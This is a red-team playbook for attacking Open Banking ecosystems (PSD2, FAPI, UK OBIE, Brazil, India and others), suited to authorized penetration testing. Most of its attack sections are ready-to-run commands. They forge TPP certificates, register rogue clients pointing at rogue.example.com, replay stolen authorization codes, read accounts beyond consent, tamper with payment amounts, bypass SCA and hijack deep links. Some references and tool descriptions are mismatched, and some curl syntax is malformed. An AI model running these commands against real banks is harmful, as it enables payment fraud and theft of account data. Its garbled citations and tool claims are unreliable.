# Open Banking Attack Playbook

> Operator's playbook for red-teaming Open Banking ecosystems (PSD2, PSD3, FAPI 1.0/2.0, OBIE, Brazil Open Finance, India Account Aggregator, US FDX, Singapore MAS APIX, Australia CDR). Target audience: experienced offensive operators already familiar with OAuth2/OIDC, financial protocols, and regulatory compliance (EBA RTS, FCA CBEST, MAS TRM).

## 1. Engagement Scoping

### 1.1 Confirm scope

| Item | Detail |
|------|--------|
| Target role | ASPSP / TPP / PISP / AISP / CBPII / PIISP |
| Allowed standards | FAPI 1.0 / FAPI 2.0 / OIDC / OAuth2 / OpenID4CIA |
| Allowed regions | UK OBIE / Brazil OF / India AA / US FDX / SG APIX / AU CDR |
| Endpoints in scope | AIS / PIS / FCS / CBPII / CIBA |
| Real payment writes | yes / no (almost always NO) |
| Test account consent | required (no real PSU consent bypass) |
| Out of scope | real PSU PII access, real payment execution, AML systems |
| Time window | |
| Communications channel | |

### 1.2 Rules of engagement

- **No real PSU impersonation** — never test against live customer accounts
- **No real payment execution** — payments must use sandbox or be cancelled pre-settlement
- **No consent manipulation on production data** — use test PSUs only
- **Notify bank ops** before any unusual traffic pattern (>1 RPS sustained)
- **Pause testing** if SCA failure rate spikes >2% on production
- **No AML evasion** — never test pattern designed to avoid AML monitoring
- **Adhere to regulator rules** — FCA, EBA, MAS, RBI, CBF, ACCC

### 1.3 Test boundaries

- Allowed: AIS read on test PSU, FCS confirm on test PSU, sandbox PIS
- Allowed (with approval): low-rate AIS polling on production test accounts
- Disallowed: production payment execution, real PSU consent forge, AML bypass

## 2. Pre-Engagement Recon

### 2.1 Discover Open Banking endpoints

```bash
# Well-known OIDC discovery
curl -s https://aspsp.example.com/.well-known/openid-configuration | jq

# PSD2 endpoint discovery (UK OBIE standard)
curl -s https://aspsp.example.com/open-banking/v3.1/discovery

# Brazil Open Finance discovery
curl -s https://aspsp.example.br/open-banking/discovery/v1/resources

# India Account Aggregator discovery
curl -s https://aa.example.in/AA_ID/API

# Well-known FAPI metadata
curl -s https://aspsp.example.com/.well-known/oauth-authorization-server | jq
```

### 2.2 Identify TPP registry entries

```bash
# EU PSD2 register (EBA)
curl -s "https://euclid.eba.europa.eu/register/api/searchServices" \
  -H "Content-Type: application/json" \
  -d '{"search":"aspsp"}' | jq

# UK FCA register
curl -s "https://register.fca.org.uk/services/V0.1/Search" \
  -G --data-urlencode "q=open banking"

# Brazil Open Finance participants
curl -s https://dir.openfinancebrasil.org.br/api/v1/participants | jq '.[].orgDomain'

# Singapore FFI registry
curl -s "https://eservices.mas.gov.sg/fid" | head
```

### 2.3 Identify third-party providers

```bash
# Yodlee / Plaid / Truelayer / Tink / Yapily endpoints
for d in api.truelayer.com api.yapily.com api.tink.com api.plaid.com development.api.yodlee.com; do
  curl -sk -o /dev/null -w "%{http_code} $d\n" "https://$d/"
done

# Reverse engineer TPP mobile apps
apktool d example-tpp.apk -o example-tpp-decoded
grep -r "openbanking\|psd2\|fapi\|client_id" example-tpp-decoded/
```

## 3. Lab Setup

### 3.1 MITRE OpenID Connect test suite

```bash
# OIDF certification test suite
git clone https://gitlab.com/openid/oidf-conformance-suite.git
cd oidf-conformance-suite
docker-compose up -d
# Visit http://localhost:8080
```

### 3.2 OAuth2 / FAPI test server

```bash
# mitreid-connect (MITREid Connect)
git clone https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server.git
cd OpenID-Connect-Java-Spring-Server
mvn package
java -jar target/openid-connect-server.war

# Or Authlete (FAPI-certified)
docker run -p 8080:8080 authlete/standard-api
```

### 3.3 UK OBIE sandbox

```bash
# Open Banking UK reference implementation
git clone https://github.com/OpenBankingUK/conformance-suite.git
cd conformance-suite
docker-compose up -d
# Test against UK OBIE v3.1.x
```

### 3.4 Brazil Open Finance sandbox

```bash
# Use bank sandboxes (Itaú, Banco do Brasil, Santander)
curl -X POST https://sandbox.devportal.com.br/auth/oauth/v2/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=client_credentials&client_id=REPLACE_WITH_YOUR_ID&client_secret=REPLACE_WITH_YOUR_SECRET"
```

### 3.5 Mock Bank + Mock TPP

```bash
# ForgeRock Open Banking reference
git clone https://github.com/OpenBankingToolbox/ob-reference-implementation.git
docker-compose up -d

# Or use Mockbank (UK OBIE)
docker run -p 8443:8443 mockbank/ob-mock-bank
```

### 3.6 PKI / eIDAS test certificates

```bash
# Generate test eIDAS QWAC/QTSP certs
openssl req -x509 -newkey rsa:4096 -keyout qwac.key -out qwac.crt \
  -days 365 -nodes -subj "/C=GB/O=TestTPP/CN=Test TPP PSD2"

# eIDAS test QTSP signature cert
openssl req -x509 -newkey rsa:2048 -keyout qtsp.key -out qtsp.crt \
  -days 365 -nodes -subj "/C=GB/O=TestTPP/CN=Test TPP PSD2 QTSP"
```

## 4. Attack Workflow — Stage by Stage

### Stage 1 — Recon (4-8 hours)

**Goal**: produce target Open Banking capability map.

```bash
# Discovery + capability matrix
for s in $(cat aspsp_list.txt); do
  echo "=== $s ===" >> recon.md
  curl -sk "https://$s/.well-known/openid-configuration" >> recon.md
  curl -sk "https://$s/open-banking/v3.1/discovery" >> recon.md
done

# Identify PAR / DPoP / JARM / mTLS support
grep -E "request_authentication\|require_pushed_authorization_requests\|dpop_signing_alg" recon.md
```

**Output**: `recon.md` with capability matrix (vendor / version / FAPI profile / endpoint set).

### Stage 2 — TPP Onboarding Attack (1-2 days)

Try in order of impact:

1. **eIDAS cert spoof** — self-signed cert claiming PSD2 role
2. **SSA manipulation** — modified Software Statement Assertion
3. **Redirect URI bypass** — open redirect in TPP registration
4. **Cert chain confusion** — valid leaf with rogue intermediate
5. **Org ID conflict** — register TPP under another org's namespace

```bash
# Forge eIDAS-style cert
openssl req -new -key rogue.key -out rogue.csr \
  -subj "/C=GB/O=RogueTPP/CN=Rogue TPP PSD2 OID.2.5.4.15=PSD2-PISP OID.1.3.6.1.4.1.311.60.2.1.3=GB"

# Submit to ASPSP registration endpoint
curl -X POST https://aspsp.example.com/register/v1.1/register/ \
  -H "Content-Type: application/jwt" \
  -H "x-iat" "$(date +%s)" \
  -H "x-jwks_url" "https://rogue.example.com/jwks.json" \
  --data-binary @ssa.jwt
```

### Stage 3 — AIS Abuse (1-2 days)

```bash
# Long-lived consent — keep polling beyond 90 days
curl https://aspsp.example.com/open-banking/v3.1/aisp/accounts \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "x-fapi-financial-id" "0015800000jf2V9AAI"

# Excessive polling (rate limit test)
while true; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    https://aspsp.example.com/open-banking/v3.1/aisp/accounts \
    -H "Authorization: Bearer $ACCESS_TOKEN"
done

# Try to read transactions for account not in consent
curl https://aspsp.example.com/open-banking/v3.1/aisp/accounts/$OTHER_ACCOUNT_ID/transactions \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

### Stage 4 — PIS Abuse (1-2 days)

```bash
# Submit domestic payment without SCA completion
curl -X POST https://aspsp.example.com/open-banking/v3.1/pisp/domestic-payments \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d @payment.json

# Tamper amount via payment-detail write-back
curl https://aspsp.example.com/open-banking/v3.1/pisp/domestic-payments/$PMT_ID \
  -X PATCH \
  -d '[{"op":"replace","path":"/amount","value":"1000000"}]'

# File payment with embedded command injection
curl -X POST https://aspsp.example.com/open-banking/v3.1/pisp/file-payments \
  --data-binary @malicious.csv
```

### Stage 5 — Token Abuse (1-2 days)

```bash
# Authorization code replay
curl -X POST https://aspsp.example.com/as/token.oauth2 \
  -d "grant_type=authorization_code&code=$STOLEN_CODE&redirect_uri=https://rogue.example.com/cb"

# Refresh token rotation abuse
curl -X POST https://aspsp.example.com/as/token.oauth2 \
  -d "grant_type=refresh_token&refresh_token=$RT1"
# (use RT1 again — should fail if rotation is correct)

# DPoP proof replay across endpoints
curl -H "DPoP: $STOLEN_DPOP_PROOF" \
     -H "Authorization: DPoP $ACCESS_TOKEN" \
     https://aspsp.example.com/open-banking/v3.1/aisp/accounts

# Sender-constrained token without mTLS
curl -H "Authorization: Bearer $MTLS_TOKEN" \
     https://aspsp.example.com/open-banking/v3.1/aisp/accounts
# (without sending client cert)
```

### Stage 6 — SCA Bypass (1-2 days)

```bash
# SCA exemption abuse (trusted beneficiary)
curl -X POST https://aspsp.example.com/open-banking/v3.1/pisp/domestic-payments \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"data":{"initiation":{"creditor":{"name":"trusted"}},"sca_exemption":"trusted_beneficiary"}}'

# CIBA decoupled SCA hijack
curl -X POST https://aspsp.example.com/bc-authorize \
  -d "client_id=$CID&scope=payments&login_hint=PSU:$(date)"

# Replay SCA result across consents
curl -X POST https://aspsp.example.com/open-banking/v3.1/pisp/domestic-payments/$PMT_ID/confirmation \
  -H "x-idempotency-key: $STOLEN_SCA_KEY"
```

### Stage 7 — Consent Manipulation (1 day)

```bash
# Read consent beyond PSU authorization scope
curl -X POST https://aspsp.example.com/open-banking/v3.1/aisp/account-access-consents \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -d '{"data":{"permissions":["ReadAccountsList","ReadBalances","ReadTransactions","ReadDirectDebits","ReadStandingOrdersDetail"]}}'

# Try to expand consent after the fact
curl -X PATCH https://aspsp.example.com/open-banking/v3.1/aisp/account-access-consents/$CONSENT_ID \
  -d '[{"op":"add","path":"/data/permissions/-","value":"ReadPAN"}]'

# Reuse consent across multiple PSUs
curl -H "Authorization: Bearer $ACCESS_TOKEN_DERIVED_FROM_OTHER_PSU" \
     https://aspsp.example.com/open-banking/v3.1/aisp/accounts
```

### Stage 8 — App-to-App Hijack (1 day)

```bash
# MITM deep link
adb shell am start -a android.intent.action.VIEW \
  -d "aspsp://authorize?client_id=$CID&redirect_uri=https://rogue.example.com/cb&state=evil"

# Custom tab hijack via deep link injection
frida -U -l deeplink-hook.js -f com.aspsp.app

# App-to-app redirect interception
mitmproxy --mode transparent -H "Host: aspsp.example.com"
```

### Stage 9 — Reporting (1-2 days)

Produce engagement report:
- Executive summary
- Findings (one per TC-OB-XXX)
- Evidence package (HTTP captures, JWTs, consent artifacts)
- Detection rules
- Remediation roadmap (mapped to FAPI 1.0/2.0 baseline)

## 5. Common Pitfalls

### 5.1 Triggering real SCA denials

Excessive token-replay tests can spike SCA failure rate >2% on production, tripping fraud monitoring.

**Fix**: Throttle to <10 requests/min in production. Coordinate with bank SOC.

### 5.2 Forgetting regulatory notifications

Most regulators (FCA, EBA, MAS, CBF) require advance notification for live Open Banking tests.

**Fix**: File 14-day pre-notification with FCA, EBA, etc. Get written acknowledgement.

### 5.3 Misjudging cross-border rules

PSD2 TPP passporting is complex. Testing under a UK eIDAS cert against a German ASPSP requires ECB notification.

**Fix**: Match TPP cert country to ASPSP country. Test cross-border separately with explicit consent.

### 5.4 Over-stepping into AML

Tests designed to avoid AML detection are illegal even with authorization.

**Fix**: Avoid patterns designed to look "legitimate" by AML systems. Do not structure transactions.

### 5.5 Leaving consents open

Open AIS consents persist 90 days by default. Always revoke at end of engagement.

**Fix**: Script consent cleanup. Verify via consent status endpoint before signing off.

## 6. Time Budget Cheat Sheet

| Engagement size | Recon | TPP onboarding | AIS abuse | PIS abuse | Token/SCA | Reporting |
|-----------------|-------|----------------|-----------|-----------|-----------|-----------|
| Single ASPSP test | 2h | 4h | 4h | 4h | 1d | 1d |
| Single TPP review | 4h | 1d | 1d | 1d | 1d | 1d |
| Multi-region estate | 1d | 2d | 2d | 2d | 2d | 2d |
| Full ecosystem audit | 1d | 3d | 3d | 3d | 3d | 3d |

## 7. Tool Inventory

### 7.1 Offensive

| Tool | Purpose | Notes |
|------|---------|-------|
| `mitmproxy` | OAuth2/PAR interception | MITM deep links, token replays |
| `burp suite` | HTTP testing | With FAPI/JWT plugins |
| `jwt_tool` | JWT analysis | Verify FAPI signatures |
| `oauthchecker` | OAuth2 testing | ForgeRock OIDF suite |
| `oidf-conformance-suite` | FAPI certification tests | Tier-1 FAPI 1.0/2.0 conformance |
| `bankapi-scanner` | Open Banking scanner | Custom |
| `frida` | Mobile app hooking | App-to-app redirects |
| `apktool` | APK reverse | TPP app analysis |
| `gsutil` | eIDAS cert ops | QWAC/QTSP cert generation |
| `burpsmartbuster` | Smart scan | Consent endpoint discovery |
| `gobuster` | Path discovery | Open Banking API enumeration |
| `kiterunner` | API discovery | OBIE/Brazil routes |
| `curl + jq` | HTTP primitives | Universal |
| `python-oauth2` | Custom clients | FAPI test harness |
| `qrcode-decoder` | QR CIBA testing | Decoupled SCA |
| `selenium` | Browser automation | App-to-app redirect |

### 7.2 Detection development

| Tool | Purpose |
|------|---------|
| Zeek HTTP log analyzers | Open Banking traffic baselines |
| Suricata Open Banking ruleset | Detect FAPI attacks |
| Sigma rules | SIEM detection pattern |
| FAPI 2.0 profile validator | CDR / APIX conformance |

## 8. Engagement Quality Checklist

Before reporting complete:

- [ ] All in-scope standards tested (FAPI 1.0, FAPI 2.0, OBIE v3.1)
- [ ] Every region profile covered (UK, EU, BR, IN, US, SG, AU)
- [ ] TPP onboarding attack attempted
- [ ] AIS consent abuse tested
- [ ] PIS amount tamper tested
- [ ] Token replay / refresh rotation tested
- [ ] SCA exemption / CIBA bypass tested
- [ ] App-to-app deep link hijack tested
- [ ] CBPII FCS abuse tested
- [ ] Detection rules authored for ≥3 findings
- [ ] Cleanup performed (all consents revoked)
- [ ] Customer debrief scheduled
- [ ] Final report delivered
- [ ] Regulator notification confirmed (FCA/EBA/MAS/CBF/RBI)

## 9. References

- FAPI 1.0 Baseline — https://openid.net/specs/openid-financial-api-part-2-1_0.html
- FAPI 2.0 Security Profile — https://openid.net/specs/fapi-2_0-security-profile.html
- FAPI 2.0 Message Signing — https://openid.net/specs/fapi-2_0-message-signing.html
- OAuth 2.0 PAR (RFC 9126) — https://www.rfc-editor.org/rfc/rfc9126
- OAuth 2.0 DPoP (RFC 9449) — https://www.rfc-editor.org/rfc/rfc9449
- OAuth 2.0 mTLS (RFC 8705) — https://www.rfc-editor.org/rfc/rfc8705
- JARM (Financial-Grade API JWT Response) — https://openid.net/specs/openid-financial-api-jarm.html
- CIBA (RFC 9126) — https://www.rfc-editor.org/rfc/rfc8693
- PSD2 Directive (EU 2015/2366) — https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=celex:32015L2366
- EBA RTS SCA — https://www.eba.europa.eu/regulation-and-policy/payment-services-and-emoney/strong-customer-authentication
- UK Open Banking Standard — https://standards.openbanking.org.uk/
- Brazil Open Finance — https://openfinancebrasil.org.br/
- India Account Aggregator — https://sahamati.org.in/
- US FDX — https://financialdataexchange.org/
- Singapore MAS APIX — https://apix.asia/
- Australia CDR — https://www.accc.gov.au/consumers/data-transparency/consumer-data-right-cdr
- OWASP API Security Top 10 — https://owasp.org/API-Security/
- OIDF FAPI Working Group — https://openid.net/wg/fapi/
- "Hacking OAuth" (Vladimir de Turckheim, 2024)
- "OAuth 2.0 in Action" (Mitre, 2024)
- "Open Banking Handbook" (OBIE, 2024)
- CISA AA24-179A — Open Banking API Abuse Patterns
- ENISA Threat Landscape for Financial Services 2024
- FS-ISAC Threat Intelligence Reports

